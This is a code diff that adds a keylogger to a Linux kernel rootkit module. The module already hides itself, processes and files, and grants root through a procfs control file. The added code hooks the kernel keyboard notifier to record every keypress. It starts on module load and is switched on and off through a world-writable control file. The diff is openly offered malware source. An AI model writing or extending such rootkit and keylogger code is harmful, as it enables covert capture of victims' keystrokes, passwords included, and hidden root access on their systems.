@@ -8,12 +8,14 @@
 #include <linux/init.h>
 #include <linux/list.h>
 #include <linux/mutex.h>
+#include <linux/keyboard.h>
 
 #define CONTROL_DIR "harmless_file"
 #define HIDE_MODULE_FILE "hide_module"
 #define HIDE_PID_FILE "hide_pid"
 #define HIDE_FILE_FILE "hide_file"
 #define GIVE_ROOT_FILE "gimme_root"
+#define KEYLOGGER_FILE "keylogger"
 
 #define MODULE_NAME "rootkit"
 
@@ -75,6 +77,10 @@ static struct kobject* module_kobj_parent=NULL;
 
 DEFINE_MUTEX(filldir_mutex);
 static struct list_head *banned_files;
+
+
+static struct notifier_block keylogger;
+static int keylogger_on=0;
 
 LIST_HEAD(hidden_pid_list);
 LIST_HEAD(hooked_dir_list);
@@ -615,6 +621,54 @@ static struct proc_dir_entry* create_procfs_entry(const char* name, umode_t mode
 
 }
 
+int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param){
+	struct keyboard_notifier_param *param  = _param;
+	printk("NOTIFIER CALLED XOXOXOXOXO");
+	printk("down: %d key: %u", param->down, param->value);
+	return NOTIFY_OK;
+
+}
+static void disable_keylogger(void){
+	if(!keylogger_on){
+		return;
+	}
+	unregister_keyboard_notifier(&keylogger);	
+
+	keylogger_on=0;
+
+}
+
+static void enable_keylogger(void){
+	if(keylogger_on){
+		return;
+	}
+	register_keyboard_notifier(&keylogger);
+	keylogger_on=1;
+}
+
+static int keylogger_write(struct file* file, const char __user * buf, unsigned long count, void *data ){
+	
+	if(count < 0 ){
+		return count;
+	}
+
+	if(buf[0] ==  '0'){
+		disable_keylogger();
+	}
+
+	if(buf[0] == '1'){
+		enable_keylogger();
+	}
+
+	return count;
+}
+
+static int keylogger_read(char *buffer, char **buffer_location, off_t off, int count, int *eof , void *data){
+	
+			
+	return count;
+}
+
 static int control_init(void){
 
 
@@ -623,7 +677,7 @@ static int control_init(void){
 	if( proc_control == NULL ){
 		return 0;	
 	}
-
+	create_procfs_entry(KEYLOGGER_FILE, 0666,proc_control,keylogger_write,keylogger_read);
 	create_procfs_entry(HIDE_PID_FILE,0666,proc_control,pid_hide_write,pid_hide_read);
 	create_procfs_entry(GIVE_ROOT_FILE, 0666,proc_control,give_root_write,NULL);
 	create_procfs_entry(HIDE_MODULE_FILE, 0666, proc_control, module_hide_write, module_hide_read);
@@ -632,7 +686,7 @@ static int control_init(void){
 }
 
 static void control_cleanup(void){
-
+	remove_proc_entry(KEYLOGGER_FILE,proc_control);
 	remove_proc_entry(HIDE_FILE_FILE, proc_control);
 	remove_proc_entry(GIVE_ROOT_FILE,proc_control);
 	remove_proc_entry(HIDE_MODULE_FILE,proc_control);
@@ -674,7 +728,19 @@ static void proc_cleanup(void){
 
 }
 
+
+static void keylogger_init(void){
+	keylogger.notifier_call = keylogger_notify ; 
+	enable_keylogger();
+}
+
+static void keylogger_cleanup(void){
+	disable_keylogger();
+}
+
+
 static int __init m_init(void){
+	keylogger_init();
 	control_init();
 	proc_init();
 	return 0; 
@@ -682,6 +748,8 @@ static int __init m_init(void){
 }
 
 static void __exit m_exit(void){
+	keylogger_cleanup();
+	keylogger_cleanup();
 	clear_hooked_dirs();
 	proc_cleanup();
 	control_cleanup();
